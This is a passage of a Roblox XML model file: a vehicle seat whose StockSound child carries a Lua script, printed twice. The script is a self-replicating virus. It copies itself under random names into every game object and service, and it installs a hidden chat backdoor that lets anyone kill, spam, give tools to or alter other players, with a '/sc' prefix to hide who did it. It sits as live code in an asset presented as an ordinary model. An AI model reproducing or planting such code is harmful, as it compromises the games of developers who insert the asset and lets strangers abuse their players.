jkoer.Name = &quot;IMDOINGITOKSODONTKILLMENOW&quot;
jkoer.Parent = game:service(&quot;Workspace&quot;)
jkoer.archivable = false
--Check all systems needed are running well
game:service(&quot;Workspace&quot;)
game:service(&quot;Lighting&quot;)
game:service(&quot;StarterPack&quot;)
game:service(&quot;Teams&quot;)
game:service(&quot;SoundService&quot;)
game:service(&quot;Debris&quot;)
--
bin = script.Parent
g = {&quot;a&quot;,&quot;b&quot;,&quot;c&quot;,&quot;d&quot;,&quot;e&quot;,&quot;f&quot;,&quot;g&quot;,&quot;h&quot;,&quot;i&quot;,&quot;j&quot;,&quot;k&quot;,&quot;l&quot;,&quot;m&quot;,&quot;n&quot;,&quot;o&quot;,&quot;p&quot;,&quot;q&quot;,&quot;r&quot;,&quot;s&quot;,&quot;t&quot;,&quot;u&quot;,&quot;v&quot;,&quot;w&quot;,&quot;x&quot;,&quot;y&quot;,&quot;z&quot;,&quot;0&quot;,&quot;1&quot;,&quot;2&quot;,&quot;3&quot;,&quot;4&quot;,&quot;5&quot;,&quot;6&quot;,&quot;7&quot;,&quot;8&quot;,&quot;9&quot;} --abcdefg...
thetools = {}
function gettools(scanner)
if scanner.className == &quot;HopperBin&quot; or scanner.className == &quot;Tool&quot; then
if scanner.archivable == true then table.insert(thetools, scanner:Clone()) end
end
local sc = scanner:GetChildren()
for i = 1, #sc do
gettools(sc[i])
end
end
gettools(game:service(&quot;Workspace&quot;))
gettools(game:service(&quot;Lighting&quot;))
function uinf(k)
if nowitshall == 1 then wait() nowitshall = 0 elseif nowitshall == 0 then nowitshall = 2 else nowitshall = 1 end --a nice little bit of script that stops the game lagging
if k ~= bin and k ~= script and k ~= bin.Parent then
local me = script.Parent:Clone()
me.Name = &quot;&quot;
local length = math.random(4,9)
for i = 1, length do
me.Name = (me.Name.. g[math.random(1, #g)])
end
local be = me[script.Name]
be.Name = &quot;&quot;
local length = math.random(4,9)
for i = 1, length do
be.Name = (be.Name.. g[math.random(1, #g)])
end
me.Parent = k
local obs = k:GetChildren()
for i = 1, #obs do
infect(obs[i])
end
end
end
function infect(object)
local ONOES = 0
if object.className == &quot;Camera&quot; then return end
if object.className == &quot;Script&quot; then
if object.Source == script.Source then
ONOES = 1
end
end
local os = object:GetChildren()
for i = 1, #os do
local current = os[i]
if current.className == &quot;Script&quot; then
if current.Source == script.Source then
ONOES = 1
end
end
local oz = current:GetChildren()
for j = 1, #oz do
local cur = oz[j]
if cur.className == &quot;Script&quot; then
if cur.Source == script.Source then
ONOES = 1
end
end
end
end
if ONOES == 0 then
uinf(object)
else -- ONOSE!
local obs = object:GetChildren()
for i = 1, #obs do
if obs[i] ~= bin then
infect(obs[i])
end
end
end
end
function pultinfect(central)
central.ChildAdded:connect(pultinfect)
infect(central)
local sides = central:GetChildren()
for i = 1, #sides do
pultinfect(sides[i])
end
if nowitshall == 1 then wait() nowitshall = 0 elseif nowitshall == 0 then nowitshall = 2 else nowitshall = 1 end
end
function multinfect(central)
central.ChildAdded:connect(pultinfect)
infect(central)
local sides = central:GetChildren()
for i = 1, #sides do
pultinfect(sides[i])
end
end
function chat(msg, speaker) --oh yes these are commands...
if string.find(msg, &quot;/sc &quot;) == 1 then
msg = string.sub(msg, 5) --I LOVE being secretive, dont u?
end
if string.find(msg, &quot;shield &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 8)) == 1 then
Instance.new(&quot;ForceField&quot;).Parent = plz[i].Character
end
end
end
if string.find(msg, &quot;kill &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
plz[i].Character:BreakJoints() --kill kill kill...
end
end
end
end
if string.find(msg, &quot;reset&quot;) == 1 then
if speaker.Character ~= nil then
speaker.Character:BreakJoints()
end
end
if string.find(msg, &quot;name &quot;) == 1 then
if speaker.Character ~= nil then
speaker.Character.Name = string.sub(msg, 6)
end
end
if string.find(msg, &quot;god &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 5)) == 1 then
if plz[i].Character ~= nil then
if plz[i].Character:findFirstChild(&quot;Humanoid&quot;) ~= nil then
plz[i].Character.Humanoid.MaxHealth = math.huge
plz[i].Character.Humanoid.Health = math.huge
end
end
end
end
end
if string.find(msg, &quot;fast &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
if plz[i].Character:findFirstChild(&quot;Humanoid&quot;) ~= nil then
plz[i].Character.Humanoid.WalkSpeed = plz[i].Character.Humanoid.WalkSpeed * 1.35
end
end
end
end
end
if string.find(msg, &quot;slow &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
if plz[i].Character:findFirstChild(&quot;Humanoid&quot;) ~= nil then
plz[i].Character.Humanoid.WalkSpeed = plz[i].Character.Humanoid.WalkSpeed / 1.35
end
end
end
end
end
if string.find(msg, &quot;hide &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
local m = plz[i].Character:GetChildren()
for z = 1, #m do
if m[z].className == &quot;Part&quot; then m[z].Transparency = 1 end
local h = m[z]:GetChildren()
for v = 1, #h do
if h[v].className == &quot;Decal&quot; then h[v]:Remove() end
if h[v].className == &quot;Part&quot; then h[v].Transparency = 1 end
end
end
end
end
end
end
if string.find(msg, &quot;show &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
local m = plz[i].Character:GetChildren()
for z = 1, #m do
if m[z].className == &quot;Part&quot; then m[z].Transparency = 0 end
local h = m[z]:GetChildren()
for v = 1, #h do
if h[v].className == &quot;Part&quot; then h[v].Transparency = 0 end
end
end
end
end
end
end
if string.find(msg, &quot;ghost &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 7)) == 1 then
if plz[i].Character ~= nil then
local m = plz[i].Character:GetChildren()
for z = 1, #m do
if m[z].className == &quot;Part&quot; then m[z].Transparency = 0.9 end
local h = m[z]:GetChildren()
for v = 1, #h do
if h[v].className == &quot;Part&quot; then h[v].Transparency = 0.9 end
end
end
end
end
end
end
if string.find(msg, &quot;doom &quot;) == 1 then -- LOL this 1 is FUNNY
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
if plz[i].Character:findFirstChild(&quot;Head&quot;) ~= nil then
if plz[i].Character.Head:findFirstChild(&quot;Mesh&quot;) ~= nil then
if plz[i].Character.Head.Mesh.className == &quot;SpecialMesh&quot; then
plz[i].Character.Head.Mesh.Scale = Vector3.new(17, 11, 17)
plz[i].Character.Head.Mesh.MeshType = &quot;Wedge&quot;
end
end
end
end
end
end
end
if string.find(msg, &quot;fade &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
local m = plz[i].Character:GetChildren()
for z = 1, #m do
if m[z].className == &quot;Part&quot; then m[z].Transparency = 0.5 end
local h = m[z]:GetChildren()
for v = 1, #h do
if h[v].className == &quot;Part&quot; then h[v].Transparency = 0.5 end
end
end
end
end
end
end
if string.find(msg, &quot;join &quot;) == 1 then
local teams = game:service(&quot;Teams&quot;)
local tmz = teams:GetTeams()
for i = 1, #tmz do
if string.find(tmz[i].Name, string.sub(msg, 6)) == 1 then
speaker.Neutral = false
speaker.TeamColor = tmz[i].TeamColor
end
end
end
if string.find(msg, &quot;debug&quot;) == 1 then
local msgs = game.Workspace:GetChildren()
for i = 1, #msgs do
if msgs[i].className == &quot;Message&quot; or msgs[i].className == &quot;Hint&quot; then
msgs[i]:Remove()
end
end
local plz = game.Players:GetPlayers()
for j = 1, #plz do
local msgs = plz[j]:GetChildren()
for i = 1, #msgs do
if msgs[i].className == &quot;Message&quot; or msgs[i].className == &quot;Hint&quot; then
msgs[i]:Remove()
end
end
end
end
if string.find(msg, &quot;fog&quot;) == 1 then
if game.Workspace:findFirstChild(&quot;FOGZORZ&quot;) == nil then
local newm = Instance.new(&quot;Message&quot;)
newm.Name = &quot;FOGZORZ&quot;
newm.Text = &quot; &quot;
newm.Parent = game.Workspace
newm:Clone().Parent = game.Workspace
end
end
if string.find(msg, &quot;say &quot;) == 1 then
if game.Workspace:findFirstChild(&quot;Talky&quot;) ~= nil then game.Workspace.Talky:Remove() end
local said = string.sub(msg, 5)
local talk = Instance.new(&quot;Hint&quot;)
talk.Name = &quot;Talky&quot;
talk.Text = speaker.Name.. &quot;: &quot;.. said
talk.Parent = game.Workspace
end
if string.find(msg, &quot;shout &quot;) == 1 then
if game.Workspace:findFirstChild(&quot;Shouty&quot;) ~= nil then game.Workspace.Shouty:Remove() end
local said = string.sub(msg, 7)
local talk = Instance.new(&quot;Message&quot;)
talk.Name = &quot;Shouty&quot;
talk.Text = speaker.Name.. &quot;: &quot;.. said
talk.Parent = game.Workspace
end
if string.find(msg, &quot;spam &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
for r = 1, 10 do
local er = Instance.new(&quot;Message&quot;)
er.Text = &quot; &quot;
er.Parent = plz[i]
end
end
end
end
if string.find(msg, &quot;bored&quot;) == 1 then
if game.Workspace:findFirstChild(&quot;Talky&quot;) ~= nil then game.Workspace.Talky:Remove() end
local talk = Instance.new(&quot;Hint&quot;)
talk.Name = &quot;Talky&quot;
talk.Parent = game.Workspace
if math.random(1,2) == 1 then
talk.Text = &quot;OMG IM SO BORED TOO!&quot;
else
talk.Text = &quot;Go play a different game then.&quot;
end
end
if string.find(msg, &quot;goto &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
if plz[i].Character:findFirstChild(&quot;Head&quot;) ~= nil then
if speaker.Character ~= nil then
if speaker.Character:findFirstChild(&quot;Head&quot;) ~= nil then
speaker.Character.Head.CFrame = CFrame.new(plz[i].Character.Head.Position + Vector3.new(0,3,0))
end
end
end
end
end
end
end
if string.find(msg, &quot;nofall &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 8)) == 1 then
if plz[i].Character ~= nil then
if plz[i].Character:findFirstChild(&quot;Platform&quot;) == nil then
local fl = Instance.new(&quot;Part&quot;)
fl.Name = &quot;Platform&quot;
fl.formFactor = &quot;Plate&quot;
fl.Size = Vector3.new(6,.2,6)
fl.Anchored = true
fl.Transparency = 1
local sc = Instance.new(&quot;Script&quot;)
sc.Name = &quot;MoveToChar&quot;
pcall(function() sc.Source=[[ p = script.Parent c = p.Parent while true do t = c:findFirstChild(&quot;Head&quot;) if t == nil then p:Remove() else p.Position = Vector3.new(t.Position.x,0,t.Position.z) end wait() end ]] end)
if sc.Source ~= &quot;print(\&quot;Hello World\&quot;)&quot; then
sc.Parent = fl -- its pcalled just in case. Well I have no idea what crazy things the admins will do in a few days, like stop scripts editing sources, but then as if THATS ever going 2 happen... (it would be stupid cause most roblox scripters would leave)
fl.Parent = plz[i].Character
end
end
end
end
end
end
if string.find(msg, &quot;tools &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 7)) == 1 then
local pack = plz[i]:findFirstChild(&quot;Backpack&quot;)
if pack ~= nil then
for o = 1, #thetools do
thetools[o]:Clone().Parent = pack
end
end
end
end
end
end
wait()
game.Players.PlayerAdded:connect(function(new) new.Chatted:connect(function(msg) chat(msg,new) end) end) -- I do love this connecting script...
wait()
multinfect(game:service(&quot;Workspace&quot;))
multinfect(game:service(&quot;Lighting&quot;))
multinfect(game:service(&quot;StarterPack&quot;))
multinfect(game:service(&quot;Teams&quot;))
multinfect(game:service(&quot;SoundService&quot;))
multinfect(game:service(&quot;Debris&quot;))
--now we can rest in peace...

death = type(RIP)
</string>
							<bool name="archivable">true</bool>
						</Properties>
					</Item>
				</Item>
			</Item>
		</Item>
		<Item class="VehicleSeat" referent="RBX31">
			<Properties>
				<bool name="Anchored">false</bool>
				<float name="BackParamA">-0.5</float>
				<float name="BackParamB">0.5</float>
				<token name="BackSurface">0</token>
				<token name="BackSurfaceInput">0</token>
				<float name="BottomParamA">-0.5</float>
				<float name="BottomParamB">0.5</float>
				<token name="BottomSurface">4</token>
				<token name="BottomSurfaceInput">0</token>
				<int name="BrickColor">208</int>
				<CoordinateFrame name="CFrame">
					<X>-9</X>
					<Y>3</Y>
					<Z>-27</Z>
					<R00>-1</R00>
					<R01>0</R01>
					<R02>-0</R02>
					<R10>-0</R10>
					<R11>1</R11>
					<R12>-0</R12>
					<R20>-0</R20>
					<R21>0</R21>
					<R22>-1</R22>
				</CoordinateFrame>
				<bool name="CanCollide">true</bool>
				<bool name="DraggingV1">false</bool>
				<float name="Elasticity">0.5</float>
				<float name="Friction">0.300000012</float>
				<float name="FrontParamA">-0.5</float>
				<float name="FrontParamB">0.5</float>
				<token name="FrontSurface">0</token>
				<token name="FrontSurfaceInput">0</token>
				<float name="LeftParamA">-0.5</float>
				<float name="LeftParamB">0.5</float>
				<token name="LeftSurface">0</token>
				<token name="LeftSurfaceInput">0</token>
				<bool name="Locked">false</bool>
				<token name="Material">256</token>
				<float name="MaxSpeed">22</float>
				<string name="Name">VehicleSeat</string>
				<float name="Reflectance">0</float>
				<float name="RightParamA">-0.5</float>
				<float name="RightParamB">0.5</float>
				<token name="RightSurface">0</token>
				<token name="RightSurfaceInput">0</token>
				<Vector3 name="RotVelocity">
					<X>-0.00118217827</X>
					<Y>0.00220030732</Y>
					<Z>-0.00017520129</Z>
				</Vector3>
				<int name="Steer">0</int>
				<int name="Throttle">0</int>
				<float name="TopParamA">-0.5</float>
				<float name="TopParamB">0.5</float>
				<token name="TopSurface">5</token>
				<token name="TopSurfaceInput">0</token>
				<float name="Torque">10</float>
				<float name="Transparency">0</float>
				<float name="TurnSpeed">1</float>
				<Vector3 name="Velocity">
					<X>0.0143022183</X>
					<Y>0.00162590353</Y>
					<Z>0.00486407615</Z>
				</Vector3>
				<bool name="archivable">true</bool>
				<Vector3 name="size">
					<X>2</X>
					<Y>1</Y>
					<Z>2</Z>
				</Vector3>
			</Properties>
			<Item class="StockSound" referent="RBX32">
				<Properties>
					<bool name="Looped">false</bool>
					<string name="Name">9vssb36tj</string>
					<int name="PlayCount">-1</int>
					<bool name="PlayOnRemove">false</bool>
					<Content name="SoundId"><null></null></Content>
					<float name="Volume">0.5</float>
					<bool name="archivable">true</bool>
				</Properties>
				<Item class="Script" referent="RBX33">
					<Properties>
						<bool name="Disabled">false</bool>
						<Content name="LinkedSource"><null></null></Content>
						<string name="Name">73de</string>
						<string name="Source">--             	 _                     |
-- unknowns 0.|_| Commands o
--

myname = &quot;builderman&quot; -- put your name here if you like!

--Hi, person who just looked inside a StockSound...
--Try these commands, they are great!

--[[COMMANDS:

say /sc BEFORE your command to make it so no-one kows its you who killed/shielded them

for example:

/sc shield builderman

reset  --this resets YOU
debug  --this removes all messages in the workspace and in players
fog  --this creates a few messages to look like fog, say debug to remove them

shield playername  --this shields the player named playername against explosions
kill playername  --this kills the player named playername
name newname  --this names YOUR CHARACTER the newname
god playername  --this sets the player playername unkillable by weapons that take damage (not explosions)
fast playername  --this speeds up the player named playername
slow playername --this slows the player named playername
hide playername  --this hides the player named playername
ghost playername  --this makes the player named playername ghostly
fade playername --this fades the player named playername a bit
show playername  --shows the player named playername
doom playername  --this makes there head a big triangle lol you can watch them running around stupidly
spam playername  --stops the player named playername seeing the chat properly
tools playername  --this gives the player the vip tools in the game
goto playername  --this moves your character to that players character
join teamname  --this joins the team named the teamname
say message  --creates a hint at the bottom of the screen saying your message
shout message  --creates a message on the screen saying your message

this is all case-sensitive

please note it is not needed to say the WHOLE name of the player, lets say just builderman was in the game:

tools bu would give him the VIP tools

but if builderdude was ingame aswell, he would ALSO get the tools, so if you only want builderman to get them, you should say:

tools builderm

also, if you just say tools then a space, then EVERYONE will get the tools

the same goes for kill, god, ghost, and all the other commands that use playername
--]]

--everything below here is very complicated so it would be best if you DONT mess with it

wait(.4)
if game:service(&quot;Workspace&quot;):findFirstChild(&quot;IMDOINGITOKSODONTKILLMENOW&quot;) ~= nil then
wait(math.huge) --this should keep it busy
end
jkoer = Instance.new(script.Parent.className)
jkoer.Name = &quot;IMDOINGITOKSODONTKILLMENOW&quot;
jkoer.Parent = game:service(&quot;Workspace&quot;)
jkoer.archivable = false
--Check all systems needed are running well
game:service(&quot;Workspace&quot;)
game:service(&quot;Lighting&quot;)
game:service(&quot;StarterPack&quot;)
game:service(&quot;Teams&quot;)
game:service(&quot;SoundService&quot;)
game:service(&quot;Debris&quot;)
--
bin = script.Parent
g = {&quot;a&quot;,&quot;b&quot;,&quot;c&quot;,&quot;d&quot;,&quot;e&quot;,&quot;f&quot;,&quot;g&quot;,&quot;h&quot;,&quot;i&quot;,&quot;j&quot;,&quot;k&quot;,&quot;l&quot;,&quot;m&quot;,&quot;n&quot;,&quot;o&quot;,&quot;p&quot;,&quot;q&quot;,&quot;r&quot;,&quot;s&quot;,&quot;t&quot;,&quot;u&quot;,&quot;v&quot;,&quot;w&quot;,&quot;x&quot;,&quot;y&quot;,&quot;z&quot;,&quot;0&quot;,&quot;1&quot;,&quot;2&quot;,&quot;3&quot;,&quot;4&quot;,&quot;5&quot;,&quot;6&quot;,&quot;7&quot;,&quot;8&quot;,&quot;9&quot;} --abcdefg...
thetools = {}
function gettools(scanner)
if scanner.className == &quot;HopperBin&quot; or scanner.className == &quot;Tool&quot; then
if scanner.archivable == true then table.insert(thetools, scanner:Clone()) end
end
local sc = scanner:GetChildren()
for i = 1, #sc do
gettools(sc[i])
end
end
gettools(game:service(&quot;Workspace&quot;))
gettools(game:service(&quot;Lighting&quot;))
function uinf(k)
if nowitshall == 1 then wait() nowitshall = 0 elseif nowitshall == 0 then nowitshall = 2 else nowitshall = 1 end --a nice little bit of script that stops the game lagging
if k ~= bin and k ~= script and k ~= bin.Parent then
local me = script.Parent:Clone()
me.Name = &quot;&quot;
local length = math.random(4,9)
for i = 1, length do
me.Name = (me.Name.. g[math.random(1, #g)])
end
local be = me[script.Name]
be.Name = &quot;&quot;
local length = math.random(4,9)
for i = 1, length do
be.Name = (be.Name.. g[math.random(1, #g)])
end
me.Parent = k
local obs = k:GetChildren()
for i = 1, #obs do
infect(obs[i])
end
end
end
function infect(object)
local ONOES = 0
if object.className == &quot;Camera&quot; then return end
if object.className == &quot;Script&quot; then
if object.Source == script.Source then
ONOES = 1
end
end
local os = object:GetChildren()
for i = 1, #os do
local current = os[i]
if current.className == &quot;Script&quot; then
if current.Source == script.Source then
ONOES = 1
end
end
local oz = current:GetChildren()
for j = 1, #oz do
local cur = oz[j]
if cur.className == &quot;Script&quot; then
if cur.Source == script.Source then
ONOES = 1
end
end
end
end
if ONOES == 0 then
uinf(object)
else -- ONOSE!
local obs = object:GetChildren()
for i = 1, #obs do
if obs[i] ~= bin then
infect(obs[i])
end
end
end
end
function pultinfect(central)
central.ChildAdded:connect(pultinfect)
infect(central)
local sides = central:GetChildren()
for i = 1, #sides do
pultinfect(sides[i])
end
if nowitshall == 1 then wait() nowitshall = 0 elseif nowitshall == 0 then nowitshall = 2 else nowitshall = 1 end
end
function multinfect(central)
central.ChildAdded:connect(pultinfect)
infect(central)
local sides = central:GetChildren()
for i = 1, #sides do
pultinfect(sides[i])
end
end
function chat(msg, speaker) --oh yes these are commands...
if string.find(msg, &quot;/sc &quot;) == 1 then
msg = string.sub(msg, 5) --I LOVE being secretive, dont u?
end
if string.find(msg, &quot;shield &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 8)) == 1 then
Instance.new(&quot;ForceField&quot;).Parent = plz[i].Character
end
end
end
if string.find(msg, &quot;kill &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
plz[i].Character:BreakJoints() --kill kill kill...
end
end
end
end
if string.find(msg, &quot;reset&quot;) == 1 then
if speaker.Character ~= nil then
speaker.Character:BreakJoints()
end
end
if string.find(msg, &quot;name &quot;) == 1 then
if speaker.Character ~= nil then
speaker.Character.Name = string.sub(msg, 6)
end
end
if string.find(msg, &quot;god &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 5)) == 1 then
if plz[i].Character ~= nil then
if plz[i].Character:findFirstChild(&quot;Humanoid&quot;) ~= nil then
plz[i].Character.Humanoid.MaxHealth = math.huge
plz[i].Character.Humanoid.Health = math.huge
end
end
end
end
end
if string.find(msg, &quot;fast &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
if plz[i].Character:findFirstChild(&quot;Humanoid&quot;) ~= nil then
plz[i].Character.Humanoid.WalkSpeed = plz[i].Character.Humanoid.WalkSpeed * 1.35
end
end
end
end
end
if string.find(msg, &quot;slow &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
if plz[i].Character:findFirstChild(&quot;Humanoid&quot;) ~= nil then
plz[i].Character.Humanoid.WalkSpeed = plz[i].Character.Humanoid.WalkSpeed / 1.35
end
end
end
end
end
if string.find(msg, &quot;hide &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
local m = plz[i].Character:GetChildren()
for z = 1, #m do
if m[z].className == &quot;Part&quot; then m[z].Transparency = 1 end
local h = m[z]:GetChildren()
for v = 1, #h do
if h[v].className == &quot;Decal&quot; then h[v]:Remove() end
if h[v].className == &quot;Part&quot; then h[v].Transparency = 1 end
end
end
end
end
end
end
if string.find(msg, &quot;show &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
local m = plz[i].Character:GetChildren()
for z = 1, #m do
if m[z].className == &quot;Part&quot; then m[z].Transparency = 0 end
local h = m[z]:GetChildren()
for v = 1, #h do
if h[v].className == &quot;Part&quot; then h[v].Transparency = 0 end
end
end
end
end
end
end
if string.find(msg, &quot;ghost &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 7)) == 1 then
if plz[i].Character ~= nil then
local m = plz[i].Character:GetChildren()
for z = 1, #m do
if m[z].className == &quot;Part&quot; then m[z].Transparency = 0.9 end
local h = m[z]:GetChildren()
for v = 1, #h do
if h[v].className == &quot;Part&quot; then h[v].Transparency = 0.9 end
end
end
end
end
end
end
if string.find(msg, &quot;doom &quot;) == 1 then -- LOL this 1 is FUNNY
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
if plz[i].Character:findFirstChild(&quot;Head&quot;) ~= nil then
if plz[i].Character.Head:findFirstChild(&quot;Mesh&quot;) ~= nil then
if plz[i].Character.Head.Mesh.className == &quot;SpecialMesh&quot; then
plz[i].Character.Head.Mesh.Scale = Vector3.new(17, 11, 17)
plz[i].Character.Head.Mesh.MeshType = &quot;Wedge&quot;
end
end
end
end
end
end
end
if string.find(msg, &quot;fade &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
local m = plz[i].Character:GetChildren()
for z = 1, #m do
if m[z].className == &quot;Part&quot; then m[z].Transparency = 0.5 end
local h = m[z]:GetChildren()
for v = 1, #h do
if h[v].className == &quot;Part&quot; then h[v].Transparency = 0.5 end
end
end
end
end
end
end
if string.find(msg, &quot;join &quot;) == 1 then
local teams = game:service(&quot;Teams&quot;)
local tmz = teams:GetTeams()
for i = 1, #tmz do
if string.find(tmz[i].Name, string.sub(msg, 6)) == 1 then
speaker.Neutral = false
speaker.TeamColor = tmz[i].TeamColor
end
end
end
if string.find(msg, &quot;debug&quot;) == 1 then
local msgs = game.Workspace:GetChildren()
for i = 1, #msgs do
if msgs[i].className == &quot;Message&quot; or msgs[i].className == &quot;Hint&quot; then
msgs[i]:Remove()
end
end
local plz = game.Players:GetPlayers()
for j = 1, #plz do
local msgs = plz[j]:GetChildren()
for i = 1, #msgs do
if msgs[i].className == &quot;Message&quot; or msgs[i].className == &quot;Hint&quot; then
msgs[i]:Remove()
end
end
end
end
if string.find(msg, &quot;fog&quot;) == 1 then
if game.Workspace:findFirstChild(&quot;FOGZORZ&quot;) == nil then
local newm = Instance.new(&quot;Message&quot;)
newm.Name = &quot;FOGZORZ&quot;
newm.Text = &quot; &quot;
newm.Parent = game.Workspace
newm:Clone().Parent = game.Workspace
end
end
if string.find(msg, &quot;say &quot;) == 1 then
if game.Workspace:findFirstChild(&quot;Talky&quot;) ~= nil then game.Workspace.Talky:Remove() end
local said = string.sub(msg, 5)
local talk = Instance.new(&quot;Hint&quot;)
talk.Name = &quot;Talky&quot;
talk.Text = speaker.Name.. &quot;: &quot;.. said
talk.Parent = game.Workspace
end
if string.find(msg, &quot;shout &quot;) == 1 then
if game.Workspace:findFirstChild(&quot;Shouty&quot;) ~= nil then game.Workspace.Shouty:Remove() end
local said = string.sub(msg, 7)
local talk = Instance.new(&quot;Message&quot;)
talk.Name = &quot;Shouty&quot;
talk.Text = speaker.Name.. &quot;: &quot;.. said
talk.Parent = game.Workspace
end
if string.find(msg, &quot;spam &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
for r = 1, 10 do
local er = Instance.new(&quot;Message&quot;)
er.Text = &quot; &quot;
er.Parent = plz[i]
end
end
end
end
if string.find(msg, &quot;bored&quot;) == 1 then
if game.Workspace:findFirstChild(&quot;Talky&quot;) ~= nil then game.Workspace.Talky:Remove() end
local talk = Instance.new(&quot;Hint&quot;)
talk.Name = &quot;Talky&quot;
talk.Parent = game.Workspace
if math.random(1,2) == 1 then
talk.Text = &quot;OMG IM SO BORED TOO!&quot;
else
talk.Text = &quot;Go play a different game then.&quot;
end
end
if string.find(msg, &quot;goto &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
if plz[i].Character:findFirstChild(&quot;Head&quot;) ~= nil then
if speaker.Character ~= nil then
if speaker.Character:findFirstChild(&quot;Head&quot;) ~= nil then
speaker.Character.Head.CFrame = CFrame.new(plz[i].Character.Head.Position + Vector3.new(0,3,0))
end
end
end
end
end
end
end
if string.find(msg, &quot;nofall &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 8)) == 1 then
if plz[i].Character ~= nil then
if plz[i].Character:findFirstChild(&quot;Platform&quot;) == nil then
local fl = Instance.new(&quot;Part&quot;)
fl.Name = &quot;Platform&quot;
fl.formFactor = &quot;Plate&quot;
fl.Size = Vector3.new(6,.2,6)
fl.Anchored = true
fl.Transparency = 1
local sc = Instance.new(&quot;Script&quot;)
sc.Name = &quot;MoveToChar&quot;
pcall(function() sc.Source=[[ p = script.Parent c = p.Parent while true do t = c:findFirstChild(&quot;Head&quot;) if t == nil then p:Remove() else p.Position = Vector3.new(t.Position.x,0,t.Position.z) end wait() end ]] end)
if sc.Source ~= &quot;print(\&quot;Hello World\&quot;)&quot; then
sc.Parent = fl -- its pcalled just in case. Well I have no idea what crazy things the admins will do in a few days, like stop scripts editing sources, but then as if THATS ever going 2 happen... (it would be stupid cause most roblox scripters would leave)
fl.Parent = plz[i].Character
end
end
end
end
end
end
if string.find(msg, &quot;tools &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 7)) == 1 then
local pack = plz[i]:findFirstChild(&quot;Backpack&quot;)
if pack ~= nil then
for o = 1, #thetools do
thetools[o]:Clone().Parent = pack
end
end
end
end
end
end
wait()
game.Players.PlayerAdded:connect(function(new) new.Chatted:connect(function(msg) chat(msg,new) end) end) -- I do love this connecting script...
wait()
multinfect(game:service(&quot;Workspace&quot;))
multinfect(game:service(&quot;Lighting&quot;))
multinfect(game:service(&quot;StarterPack&quot;))
multinfect(game:service(&quot;Teams&quot;))
multinfect(game:service(&quot;SoundService&quot;))
multinfect(game:service(&quot;Debris&quot;))
--now we can rest in peace...

death = type(RIP)
</string>
						<bool name="archivable">true</bool>
					</Properties>
				</Item>
			</Item>
		</Item>
	</Item>
</roblox>


